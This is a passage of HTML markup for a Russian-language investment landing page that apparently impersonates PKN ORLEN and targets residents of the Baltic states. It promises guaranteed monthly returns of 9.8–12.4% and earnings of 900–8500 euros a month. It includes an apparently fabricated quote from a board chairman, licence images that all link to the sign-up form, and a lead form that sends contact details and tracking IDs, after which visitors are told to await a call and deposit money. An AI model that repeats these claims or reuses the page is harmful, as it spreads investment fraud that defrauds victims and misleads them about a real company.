                        d="M24.6895 66.8742H16.5649C16.3952 66.8742 16.2328 66.8058 16.1157 66.6826C15.9973 66.5606 15.9338 66.3968 15.9399 66.2273L16.1646 59.9775C16.1768 59.6406 16.4527 59.3745 16.7896 59.3745H24.6897C25.0352 59.3745 25.3147 59.654 25.3147 59.9995V66.2493C25.3145 66.5947 25.035 66.8742 24.6895 66.8742ZM17.213 65.6243H24.0645V60.6245H17.3924L17.213 65.6243Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M34.5648 49.3747H27.1897C26.8444 49.3747 26.5647 49.0952 26.5647 48.7497V42.4998C26.5647 42.1545 26.8444 41.875 27.1897 41.875H34.527C34.8712 41.875 35.1495 42.152 35.152 42.4962L35.1898 48.7461C35.1911 48.9122 35.1251 49.072 35.0079 49.1904C34.8908 49.3088 34.7308 49.3747 34.5648 49.3747ZM27.8145 48.1247H33.9361L33.9056 43.1248H27.8145V48.1247Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M14.652 49.3748H6.87768C6.70548 49.3748 6.54078 49.304 6.42363 49.1782C6.30523 49.0537 6.24423 48.8853 6.25393 48.7131L6.61648 42.4634C6.63603 42.1339 6.90943 41.875 7.24023 41.875H14.878C15.0475 41.875 15.21 41.9444 15.3284 42.0668C15.4456 42.1888 15.5091 42.3536 15.503 42.5219L15.2773 48.7717C15.2648 49.1088 14.9889 49.3748 14.652 49.3748ZM7.54037 48.1248H14.049L14.2297 43.125H7.82972L7.54037 48.1248Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M24.6895 49.3747H17.152C16.9823 49.3747 16.82 49.3051 16.7016 49.1829C16.5844 49.0609 16.5209 48.8961 16.527 48.7276L16.7529 42.4779C16.7651 42.141 17.041 41.875 17.3779 41.875H24.6897C25.0352 41.875 25.3147 42.1545 25.3147 42.4998V48.7497C25.3145 49.0952 25.035 49.3747 24.6895 49.3747ZM17.8002 48.1247H24.0645V43.1248H17.9808L17.8002 48.1247Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M44.0392 29.688H7.35255C7.1841 29.688 7.02175 29.6196 6.90335 29.4983C6.78605 29.3767 6.72271 29.2131 6.72755 29.0442L6.96545 21.232C6.9764 20.8945 7.2523 20.626 7.59044 20.626H43.8389C44.1783 20.626 44.4553 20.8964 44.4639 21.2352L44.6639 29.0473C44.6675 29.2158 44.6042 29.3788 44.487 29.4997C44.3688 29.6196 44.2077 29.688 44.0392 29.688ZM7.99694 28.4381H43.3983L43.2298 21.8758H8.1973L7.99694 28.4381Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M72.5002 55.6246C69.3985 55.6246 66.8754 53.1015 66.8754 49.9998C66.8754 46.8981 69.3985 44.375 72.5002 44.375C75.6019 44.375 78.125 46.8981 78.125 49.9998C78.125 53.1015 75.6019 55.6246 72.5002 55.6246ZM72.5002 45.625C70.0881 45.625 68.1254 47.5879 68.1254 50C68.1254 52.4119 70.0881 54.3748 72.5002 54.3748C74.9123 54.3748 76.875 52.4119 76.875 50C76.875 47.5879 74.9123 45.625 72.5002 45.625Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M72.5002 58.1243C69.3985 58.1243 66.8754 55.6012 66.8754 52.4995C66.8754 52.154 67.1549 51.8745 67.5004 51.8745C67.8459 51.8745 68.1254 52.154 68.1254 52.4995C68.1254 54.9114 70.0881 56.8743 72.5002 56.8743C74.9123 56.8743 76.875 54.9114 76.875 52.4995C76.875 52.154 77.1545 51.8745 77.5 51.8745C77.8455 51.8745 78.125 52.154 78.125 52.4995C78.125 55.6012 75.6019 58.1243 72.5002 58.1243Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M67.5004 53.1247C67.1549 53.1247 66.8754 52.8452 66.8754 52.4999V50C66.8754 49.6545 67.1549 49.375 67.5004 49.375C67.8459 49.375 68.1254 49.6545 68.1254 50V52.4999C68.1254 52.8452 67.8459 53.1247 67.5004 53.1247Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M77.5 53.1247C77.1545 53.1247 76.875 52.8452 76.875 52.4999V50C76.875 49.6545 77.1545 49.375 77.5 49.375C77.8455 49.375 78.125 49.6545 78.125 50V52.4999C78.125 52.8452 77.8455 53.1247 77.5 53.1247Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M72.5002 51.8748C72.1547 51.8748 71.8752 51.5953 71.8752 51.2498V48.75C71.8752 48.4045 72.1547 48.125 72.5002 48.125C72.8457 48.125 73.1252 48.4045 73.1252 48.75V51.2498C73.1252 51.5953 72.8457 51.8748 72.5002 51.8748Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M65.0005 75.6238C60.5206 75.6238 56.8759 71.9789 56.8759 67.4992C56.8759 63.0194 60.5207 59.3745 65.0005 59.3745C69.4803 59.3745 73.1252 63.0195 73.1252 67.4992C73.1252 71.9789 69.4801 75.6238 65.0005 75.6238ZM65.0005 60.6244C61.2103 60.6244 58.1259 63.709 58.1259 67.499C58.1259 71.2892 61.2103 74.3737 65.0005 74.3737C68.7905 74.3737 71.8752 71.2892 71.8752 67.499C71.8752 63.709 68.7905 60.6244 65.0005 60.6244Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M65.0005 78.1237C60.5206 78.1237 56.8759 74.4788 56.8759 69.999C56.8759 69.6535 57.1554 69.374 57.5009 69.374C57.8462 69.374 58.1259 69.6535 58.1259 69.999C58.1259 73.789 61.2103 76.8738 65.0005 76.8738C68.7905 76.8738 71.8752 73.789 71.8752 69.999C71.8752 69.6535 72.1547 69.374 72.5002 69.374C72.8457 69.374 73.1252 69.6535 73.1252 69.999C73.1252 74.4788 69.4801 78.1237 65.0005 78.1237Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M65.0005 70.6238C64.655 70.6238 64.3755 70.3443 64.3755 69.9988V64.999C64.3755 64.6535 64.655 64.374 65.0005 64.374C65.3458 64.374 65.6253 64.6535 65.6253 64.999V69.9988C65.6253 70.3443 65.3458 70.6238 65.0005 70.6238Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M72.5002 70.6238C72.1547 70.6238 71.8752 70.3444 71.8752 69.9989V67.499C71.8752 67.1537 72.1547 66.874 72.5002 66.874C72.8457 66.874 73.1252 67.1537 73.1252 67.499V69.9989C73.1252 70.3444 72.8457 70.6238 72.5002 70.6238Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M57.5009 70.6238C57.1554 70.6238 56.8759 70.3444 56.8759 69.9989V67.499C56.8759 67.1537 57.1554 66.874 57.5009 66.874C57.8462 66.874 58.1259 67.1537 58.1259 67.499V69.9989C58.1259 70.3444 57.8462 70.6238 57.5009 70.6238Z"
                        fill="#116FFF"
                      ></path>
                    </g>
                  </svg>
                </div>
                <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
Быстрый вывод средств на карту любого Банка                </p>
              </div>
            </article>
          </div>
          <div
            class="pl-8 inline-block sm:float-none float-left sm:w-screen sm:-ml-4 sm:p-0 w-3/5"
          >
            <article
              class="p-8 sm:pt-20 sm:pb-12 sm:px-4 flex flex-col bg-secondary text-white"
            >
              <h3
                class="text-3xl sm:text-3xl sm:mb-16 font-bold font-ubuntu mb-8"
              >
            Что вам нужно сделать сейчас, чтобы начать зарабатывать в ORLEN?
              </h3>
              <ul class="text-lg">
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span>
Зарегистрируйтесь на этом сайте в форме выше                </li>
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span>
                Дождитесь звонка финансового эксперта и подтвердите регистрацию
                </li>
                <li class="mb-10 flex items-start">
                  <span
                    class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"
                  ></span>
                Внесите соответствующую сумму инвестиций на свой счет, и вы получите свою первую прибыль вечером того же дня.
                </li>
              </ul>
            </article>
          </div>
        </div>
        <div class="w-full flex sm:flex-col-reverse">
          <div class="pt-18 inline-block w-2/5 text-primary sm:p-0 sm:w-full">
            <article class="flex flex-col text-lg sm:text-base">
              <h4 class="text-2xl font-ubuntu font-bold mb-2">
г-н Войцех Ясинский              </h4>
              <h5 class="text-black opacity-50 mb-10 sm:mb-6">
Председатель Наблюдательного совета Компании              </h5>
              <p class="mb-8 sm:leading-relaxed">
            Мы решили открыть доступ к инвестициям для всех граждан, так как это будет выгодно как для PKN ORLEN, так и для жителей
            Литвы, Латвии и Эстонии.
                <br /><br />
            Дело в том, что на данный момент на мировом рынке есть спрос на газ. Во всех странах мира спрос на его покупку
            стремительно растет. По этой причине мы решили увеличить добычу газа в четыре раза и привлечь инвесторов с Прибалтийских
            стран.
                <br /><br />
                Поскольку цены на газ быстро меняются, каждый, кто инвестирует в проекты PKN ORLEN, зарабатывает в среднем 900-8500 евро
                в месяц.
              </p>
              <div class="text-base">
                <a
                  href="#form"
                  
                  class="inline-block text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
                  >Регистрация</a
                >
              </div>
            </article>
          </div>
          <div
            class="pt-18 sm:mt-0 sm:-ml-4 sm:p-0 sm:w-screen sm:mb-8 sm:overflow-hidden pl-8 relative inline w-3/5 text-primary"
          >
            <img src="img/10.jpg" alt="photo" />
          </div>
        </div>
      </section>

      <div class="pt-8 pb-8 bg-primary mb-20">
        <section class="container mx-auto flex justify-center pb-12 pt-12">
          <div
            class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full"
          >
            <form
              id="form3"
              class="block bg-white text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-4 sm:leading-tight"
            >
              <h3
                class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10"
              >
Сколько я буду зарабатывать?              </h3>
              <div
                class="flex flex-col text-center font-bold mb-4 sm:mb-10 px-5"
              >
                <label class="block text-center font-bold mb-2"
                  >Ваши инвестиции</label
                >
             
                    <input type="text" class="js-range-slider" name="my_range" value="" />

              </div>
              <div class="flex flex-col mb-5">
                <label class="block text-center font-bold">Ваша прибыль</label>
                <h3
                  class="text-2xl text-center font-bold font-ubuntu mt-5"
                  id="calcResult"
                >
                352 EUR
                </h3>
              </div>
              <div class="flex mb-4 justify-center">
                <a
                  href="#form"
                  
                  class="inline-block text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
                >
Регистрация                </a>
              </div>
            </form>
          </div>
        </section>
      </div>
      <div class="container mx-auto mb-24 sm:mb-24 text-center">
        <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center">
Правовая база и сертификаты        </h2>
        <div class="w-full sm:flex sm:flex-col">
          <div class="inline-block sm:float-none sm:-ml-4 sm:w-screen w-1/2">
            <div class="license-block">
                <a href="#form" data-fancybox="gallery" class="license-img fancy-img slick-slide slick-current slick-active" href="img/11.png"
                  data-slick-index="0" aria-hidden="false" tabindex="0" style="
                                        width: 375px;
                                        position: relative;
                                        left: 0px;
                                        top: 0px;
                                        z-index: 999;
                                        opacity: 1;
                                      ">
                  <img src="img/11.png" alt="Лицензия" class="w-1/2 mx-auto" /> </a><a href="#form" data-fancybox="gallery"
                  class="license-img fancy-img slick-slide" href="img/12.png" data-slick-index="1" aria-hidden="true" tabindex="-1"
                  style="
                                        width: 375px;
                                        position: relative;
                                        left: -375px;
                                        top: 0px;
                                        z-index: 998;
                                        opacity: 0;
                                      ">
                  <img src="img/12.png" alt="Лицензия" class="w-1/2 mx-auto" /> </a><a href="#form" data-fancybox="gallery"
                  class="license-img fancy-img slick-slide" href="img/13.png" data-slick-index="2" aria-hidden="true" tabindex="-1"
                  style="
                                        width: 375px;
                                        position: relative;
                                        left: -750px;
                                        top: 0px;
                                        z-index: 998;
                                        opacity: 0;
                                      ">
                  <img src="img/13.png" alt="Лицензия" class="w-1/2 mx-auto" /> </a><a href="#form" data-fancybox="gallery"
                  class="license-img fancy-img slick-slide" href="img/14.png" data-slick-index="3" aria-hidden="true" tabindex="-1"
                  style="
                                        width: 375px;
                                        position: relative;
                                        left: -1125px;
                                        top: 0px;
                                        z-index: 998;
                                        opacity: 0;
                                      ">
                  <img src="img/14.png" alt="Лицензия" class="w-1/2 mx-auto" />
                </a>
            </div>
          </div>
        </div>
      </div>
      <style>
        .rate-box__change.rate-box__change--higher {
          color: #62a33d;
          font-family: "VetoW05 Medium", sans-serif;
          font-size: 1.2rem;
          line-height: 1.3em;
          font-weight: bold;
        }

        .rate-box .rate-box__amount {
          font-family: "VetoW05 Light", sans-serif;
          color: #586882;
          font-size: 36px;
        }

        .rate-box .rate-box__amount span.rate-box__unit {
          padding-left: 5px;
          font-size: 18px;
        }

        .rate-box .rate-box__info {
          font-family: "VetoW05 Light", sans-serif;
          line-height: 1.4em;
          font-size: 1.15rem;
          color: #586882;
        }
      </style>
      <section id="posts" class="w-full">
        <h2 class="mb-8 text-3xl sm:text-3xl font-bold font-ubuntu text-center">
PKN ORLEN — одна из крупнейших листинговых компаний          <br class="sm:hidden" />
        на Прибалтийской фондовой бирже
        </h2>
        <div class="mb-6 sm:mb-0 w-8/12 m-auto sm:w-full p-4 flex sm:flex-wrap">
          <div
            class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center"
          >
            <div class="rate-box__change rate-box__change--higher">0,98 %</div>
            <div class="rate-box__amount">
            1,090<span class="rate-box__unit">EUR</span>
            </div>
            <div class="rate-box__info">Текущий курс обмена ORLEN</div>
          </div>
          <div
            class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center"
          >
            <div class="rate-box__change rate-box__change--higher">0,54 %</div>
            <div class="rate-box__amount">
            15.87<span class="rate-box__unit">EUR/МВтчт</span>
            </div>
            <div class="rate-box__info">Цена на природный газ(спот)</div>
          </div>
          <div
            class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center"
          >
            <div class="rate-box__change rate-box__change--higher">0,82 %</div>
            <div class="rate-box__amount">
            48,94<span class="rate-box__unit">EUR/барр</span>
            </div>
            <div class="rate-box__info">Цена на нефть (Брент)</div>
          </div>
        </div>
        <div class="text-white flex sm:flex-wrap">
          <div class="w-1/2 sm:w-full">
            <article class="flex post items-end">
              <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                <img
                  class="h-full sm:h-auto sm:w-full tr-center"
                  src="img/15.jpg"
                  alt=""
                />
              </div>
              <div class="relative z-10 p-8 sm:p-4 sm:px-4">
                <h3 class="mb-4 font-bold font-ubuntu text-3xl sm:text-2xl">
Проект Балтийская Труба                </h3>
                <p class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">
9,8% гарантированных ежемесячных платежей                </p>
                <p
                  style="
                    font-weight: bold;
                    background: #f11313;
                    color: #fff;
                    display: inline-block;
                    padding: 5px;
                  "
                  class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu"
                >
Первая инвестиция 190 евро                </p>
                <p class="mb-8 sm:mb-2 text-lg sm:text-base">
                Система газопроводов, соединяющая Норвегию, Данию и Прибалтийских стран, мощностью 10 млрд м³ в год
                </p>
                <div>
                  <a
                    href="#form"
                    class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
                    >Зарегистрируйтесь</a
                  >
                </div>
              </div>
            </article>
          </div>
          <div class="w-1/2 sm:w-full">
            <article class="flex post items-end">
              <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                <img
                  class="h-full sm:h-auto sm:w-full tr-center"
                  src="img/16.jpg"
                  alt=""
                />
              </div>
              <div class="relative z-10 p-8 sm:p-4 sm:px-4">
                <h3 class="mb-4 font-bold font-ubuntu text-3xl sm:text-2xl">
Норвежский Континентальный Шельф                </h3>
                <p class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">
12,4% гарантированных ежемесячных платежей                </p>
                <p
                  style="
                    font-weight: bold;
                    background: #f11313;
                    color: #fff;
                    display: inline-block;
                    padding: 5px;
                  "
                  class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu"
                >
Первая инвестиция 320 евро                </p>
                <p class="mb-8 sm:mb-2 text-lg sm:text-base">
                Основной задачей этой компании является разведка и добыча сырой нефти и природного газа в следующих районах: Скарв,
                Джина Крог, Морвин, Вилье, Вале.
                </p>
                <div>
                  <a
                    href="#form"
                    
                    class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
                    >Зарегистрируйтесь</a
                  >
                </div>
              </div>
            </article>
          </div>
        </div>
      </section>
      <div class="pt-8 pb-8 bg-primary mb-20">
        <section class="container mx-auto flex justify-center pb-12 pt-12">
          <div
            class="custom flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full"
          >
            <div class="w-auto text-center flex justify-center items-center">
              <img
                style="max-width: 120px; object-fit: contain"
                src="img/9.svg"
                alt="logo"
              />
            </div>
            <h3
              class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10"
            >
Начните зарабатывать на ресурсах            </h3>
            <form method="POST" action="thanks/index.php" class="form-container">
              <div class="reg-form__preloader hidden">
                <img src="img/preloader.gif" alt="" class="reg-form__preloader-img" />
              </div>
              <div class="form_group--name">
            
                <input class="form-input" type="text" name="f_name" placeholder="Имя" required="" />
              </div>
              <div class="form_group--name">
            
                <input class="form-input" type="text" name="l_name" placeholder="Фамилия" required="" />
              </div>
              <div class="form_group--email">
                <input class="form-input" type="email" name="email" placeholder="E-mail" required="" />
              </div>
                               <input class="form-input" name="phone" type="tel" required="" />

              <div class="form_group--button">
                <button  class="send-form btn btn-primary" type="submit">
                  <span  class="button--inner">Регистрация</span>
                </button>
              </div>
              <div class="form_input--hidden">
                <input type="hidden" name="phone2" class="phone2" autocomplete="off" required />
                <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>" />
                <input type="hidden" name="page_lang" value="<?php echo $page_lang?>" />
                <input type="hidden" name="query" value="<?php echo $QUERY?>" />
                <input type="hidden" name="gp_id" value="<?php echo $gp?>" />
                <input type="hidden" name="hs_id" value="<?php echo $hs?>" />
                <input type="hidden" name="ip" id="ip" />
                <input type="hidden" name="landing" value="ORLEN-RU" />
                <input type="hidden" name="description" value="ORLEN-RU" />
                <input type="hidden" name="add_inputs" id="desc" value="" />
              </div>
            </form>
          </div>
        </section>
      </div>

      <section
        id="partners"
        class="container sm:px-0 flex flex-col items-center mx-auto"
      >
        <div
          class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-between"
        >
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM4.95524 23.7959H11.7858C12.7071 23.831 13.4493 24.1245 13.7054 25.1092L15.1909 32.2537C13.7314 28.5166 10.2142 25.4072 4.89858 24.12L4.95524 23.7959ZM13.2204 40.0905L9.27479 26.6106C12.111 28.4259 14.5269 31.3064 15.3779 33.3109L15.838 34.9755L20.153 23.9512H24.8215L17.8833 40.0871L13.2204 40.0905ZM28.2527 40.1019H23.847L26.6017 23.9342H31.0096L28.2527 40.1019ZM35.9195 40.3444C33.9445 40.324 32.0419 39.933 31.0108 39.4809L31.6306 35.8628L32.1983 36.12C33.6453 36.724 34.5824 36.9687 36.3467 36.9687C37.6125 36.9687 38.9688 36.4735 38.9813 35.3903C38.9892 34.682 38.4136 34.1767 36.698 33.3835C35.0255 32.6106 32.8113 31.3143 32.8385 28.9925C32.8623 25.8503 35.9309 23.6577 40.2856 23.6577C41.9921 23.6577 43.3598 24.0089 44.2323 24.3364L43.6374 27.8412L43.2397 27.6543C42.4283 27.3279 41.3847 27.0129 39.9422 27.0356C38.2176 27.0356 37.4176 27.754 37.4176 28.4259C37.4085 29.1829 38.3513 29.6815 39.8924 30.4316C42.434 31.5852 43.6091 32.9846 43.5932 34.8237C43.5592 38.1778 40.553 40.3444 35.9195 40.3444ZM55.013 40.1087C55.013 40.1087 54.6108 38.2503 54.4771 37.686C53.8357 37.686 49.3394 37.6792 48.834 37.6792C48.6629 38.1155 47.9082 40.1087 47.9082 40.1087H43.2816L49.8232 25.2928C50.2878 24.2401 51.0754 23.9512 52.1314 23.9512H55.5354L59.1014 40.1075L55.013 40.1087Z"
                fill="currentColor"
              ></path>
              <path
                d="M52.7388 29.7053L52.4419 28.3115C52.2175 28.92 51.8311 29.8979 51.8561 29.8549C51.8561 29.8549 50.4634 33.4435 50.1008 34.3738H53.7598C53.583 33.5636 52.7388 29.7053 52.7388 29.7053Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M17.055 29.2485C15.8561 29.2485 14.9372 29.6338 14.9372 29.6338L14.6833 31.1409C14.6833 31.1409 15.4414 30.8327 16.5893 30.8327C17.2408 30.8327 17.7168 30.9052 17.7168 31.4344C17.7168 31.7562 17.659 31.8752 17.659 31.8752C17.659 31.8752 17.1457 31.8332 16.9077 31.8332C15.3949 31.8332 13.8063 32.4769 13.8063 34.4247C13.8063 35.959 14.8476 36.3092 15.4947 36.3092C16.7287 36.3092 17.2612 35.5092 17.2884 35.5069L17.2306 36.1754H18.7706L19.4573 31.3596C19.4561 29.3143 17.6737 29.2485 17.055 29.2485ZM16.1915 34.844C15.6488 34.844 15.5071 34.4304 15.5071 34.1834C15.5071 33.7052 15.7666 33.1296 17.0482 33.1296C17.3474 33.1307 17.3791 33.1613 17.4289 33.1703C17.4629 33.465 17.2454 34.844 16.1915 34.844Z"
                fill="currentColor"
              ></path>
              <path
                d="M22.6164 30.8635C22.8623 30.8635 23.8107 30.9417 23.8107 30.9417L24.0317 29.3983C24.0317 29.3983 23.4175 29.2612 22.4181 29.2612C21.1241 29.2612 19.8119 29.7779 19.8119 31.5445C19.8119 33.5479 22.0011 33.344 22.0011 34.1893C22.0011 34.7513 21.3892 34.7978 20.9178 34.7978C20.1008 34.7978 19.3666 34.519 19.3643 34.5304L19.1309 36.0612C19.1728 36.0726 19.626 36.2743 21.0935 36.2743C21.4867 36.2743 23.7382 36.3762 23.7382 34.0522C23.7382 31.8788 21.6544 32.3083 21.6544 31.4346C21.6544 30.9995 21.9932 30.8635 22.6164 30.8635Z"
                fill="currentColor"
              ></path>
              <path
                d="M26.2957 31.0607H27.2215L27.4447 29.4153H26.5722L26.7501 28.3955H25.0017C24.9631 28.4329 23.9694 34.1473 23.9694 34.8408C23.9694 35.8731 24.5484 36.3309 25.3631 36.323C26.0011 36.3185 26.4985 36.1417 26.6742 36.093L26.8929 34.6063C26.7728 34.6063 26.5971 34.6584 26.4419 34.6584C25.8334 34.6584 25.7665 34.3332 25.8051 34.0941L26.2957 31.0607Z"
                fill="currentColor"
              ></path>
              <path
                d="M33.6237 21.5151H30.5031C30.0838 22.0817 29.6895 22.6845 29.3325 23.2738H34.8997C34.5133 22.6596 34.0861 22.0726 33.6237 21.5151Z"
                fill="currentColor"
              ></path>
              <path
                d="M57.9728 41.2975C57.9388 41.2465 57.9105 41.2079 57.8878 41.1841C57.8754 41.1728 57.8595 41.1603 57.8391 41.1547C57.8878 41.1513 57.9286 41.1332 57.9581 41.1026C57.9864 41.072 58.0023 41.0357 58.0023 40.9938C58.0023 40.9643 57.9932 40.936 57.9762 40.9099C57.9592 40.8839 57.9343 40.8646 57.9037 40.8544C57.8754 40.8431 57.8266 40.8374 57.7598 40.8374H57.5626V41.4096H57.6555V41.1671H57.7088C57.7405 41.1671 57.7666 41.1739 57.7813 41.1875C57.8051 41.2068 57.8391 41.251 57.8788 41.3201L57.9286 41.4108H58.0431L57.9728 41.2975ZM57.7666 41.0912H57.6533V40.919H57.7598C57.804 40.919 57.8334 40.9224 57.8504 40.9292C57.8686 40.936 57.8799 40.9462 57.8901 40.9586C57.8992 40.9722 57.9037 40.987 57.9037 41.0028C57.9037 41.0289 57.8946 41.0516 57.8754 41.0674C57.8561 41.0822 57.8187 41.0912 57.7666 41.0912Z"
                fill="currentColor"
              ></path>
              <path
                d="M35.8459 24.9995H28.3592C27.881 25.9049 27.5638 26.5893 27.4742 26.7593H36.5553C36.3502 26.1542 36.1145 25.5684 35.8459 24.9995Z"
                fill="currentColor"
              ></path>
              <path
                d="M11.6634 27.856L9.93993 32.9664L9.85041 27.856H7.29857L5.90027 36.1834H7.58752L8.65154 29.9058L8.80792 36.1834H10.0125L12.2595 29.9058L11.2634 36.1834H13.0538L14.4328 27.856H11.6634Z"
                fill="currentColor"
              ></path>
              <path
                d="M45.4039 29.2485C44.2028 29.2485 43.285 29.6338 43.285 29.6338L43.03 31.1409C43.03 31.1409 43.7892 30.8327 44.936 30.8327C45.5875 30.8327 46.0646 30.9052 46.0646 31.4344C46.0646 31.7562 46.0045 31.8752 46.0045 31.8752C46.0045 31.8752 45.4923 31.8332 45.2521 31.8332C43.7405 31.8332 42.153 32.4769 42.153 34.4247C42.153 35.959 43.1954 36.3092 43.8413 36.3092C45.0742 36.3092 45.6068 35.5092 45.6351 35.5069L45.5773 36.1754H47.1161L47.8028 31.3596C47.8062 29.3143 46.0226 29.2485 45.4039 29.2485ZM44.5428 34.844C43.9988 34.844 43.8583 34.4304 43.8583 34.1834C43.8583 33.7052 44.1178 33.1296 45.3994 33.1296C45.6974 33.1307 45.7292 33.1613 45.7802 33.1703C45.813 33.465 45.5943 34.844 44.5428 34.844Z"
                fill="currentColor"
              ></path>
              <path
                d="M58.0283 35.4167C57.9819 35.3306 57.9139 35.2648 57.8289 35.2195C57.745 35.1731 57.6589 35.1504 57.5683 35.1504C57.481 35.1515 57.3938 35.1742 57.3077 35.2195C57.2227 35.2648 57.1569 35.3306 57.1094 35.4167C57.0618 35.5017 57.038 35.5901 57.038 35.6818C57.038 35.7736 57.0618 35.8609 57.1094 35.9447C57.1558 36.0286 57.2215 36.0954 57.3054 36.143C57.3904 36.1895 57.4776 36.2133 57.5683 36.2133C57.6612 36.2133 57.7496 36.1895 57.8323 36.143C57.9162 36.0954 57.9819 36.0286 58.0283 35.9447C58.0771 35.8609 58.0986 35.7736 58.0986 35.6818C58.0986 35.5878 58.0759 35.4994 58.0283 35.4167ZM57.9547 35.9005C57.9162 35.9708 57.8618 36.024 57.7904 36.066C57.7201 36.1045 57.6476 36.1249 57.5717 36.1249C57.4946 36.1249 57.421 36.1045 57.3518 36.066C57.2805 36.0263 57.2272 35.9719 57.1864 35.9005C57.1456 35.8291 57.1275 35.7566 57.1275 35.6807C57.1275 35.6048 57.1467 35.5311 57.1887 35.4597C57.2283 35.3895 57.2816 35.3351 57.3541 35.2954C57.4266 35.2558 57.498 35.2388 57.5717 35.2388C57.6453 35.2388 57.7179 35.2569 57.787 35.2954C57.8595 35.3351 57.9128 35.3883 57.9524 35.4597C57.9921 35.5311 58.0136 35.6048 58.0136 35.6807C58.0136 35.7566 57.9943 35.8303 57.9547 35.9005Z"
                fill="currentColor"
              ></path>
              <path
                d="M57.7485 35.8619C57.7156 35.8087 57.6862 35.7713 57.6646 35.7486C57.651 35.7361 57.6363 35.7259 57.6159 35.7191C57.6646 35.7157 57.7043 35.6976 57.7338 35.667C57.7621 35.6375 57.7791 35.599 57.7791 35.5582C57.7791 35.5299 57.77 35.5004 57.7519 35.4744C57.7338 35.4494 57.71 35.4302 57.6816 35.4189C57.6533 35.4075 57.6035 35.4019 57.5366 35.4019H57.3372V35.973H57.4301V35.7305H57.4833C57.5162 35.7305 57.5423 35.7373 57.5581 35.7497C57.5819 35.7701 57.6136 35.8132 57.6556 35.8846L57.7043 35.9741H57.8187L57.7485 35.8619ZM57.5445 35.6523H57.4323V35.4789H57.5366C57.5819 35.4789 57.6114 35.4823 57.6295 35.488C57.6442 35.4959 57.6578 35.5038 57.6669 35.5186C57.6771 35.5333 57.6816 35.5458 57.6816 35.565C57.6816 35.59 57.6714 35.6115 57.6544 35.6273C57.6329 35.6466 57.5978 35.6523 57.5445 35.6523Z"
                fill="currentColor"
              ></path>
              <path
                d="M51.3462 29.3315C50.5632 29.3315 49.9819 30.4001 49.9819 30.4001L50.1383 29.4177H48.5088L47.4176 36.1961H49.2125C49.7236 33.2998 49.8165 30.9508 51.0301 31.3803C51.2442 30.2607 51.4505 29.8267 51.6828 29.3542C51.6828 29.3553 51.574 29.3315 51.3462 29.3315Z"
                fill="currentColor"
              ></path>
              <path
                d="M55.8561 27.8652L55.4788 30.2052C55.4788 30.2052 54.8216 29.2952 53.7904 29.2952C52.187 29.2964 50.8522 31.2284 50.8522 33.4471C50.8522 34.8805 51.5649 36.2845 53.0199 36.2845C54.068 36.2845 54.6482 35.5536 54.6482 35.5536L54.5723 36.178H56.2731L57.6102 27.8618L55.8561 27.8652ZM53.6386 34.5848C53.0085 34.5848 52.7139 34.0567 52.7139 33.2273C52.7139 31.8709 53.3224 30.9768 54.0918 30.9768C54.7196 30.978 55.0425 31.4097 55.0425 32.4273C55.0425 33.3508 54.5859 34.5848 53.6386 34.5848Z"
                fill="currentColor"
              ></path>
              <path
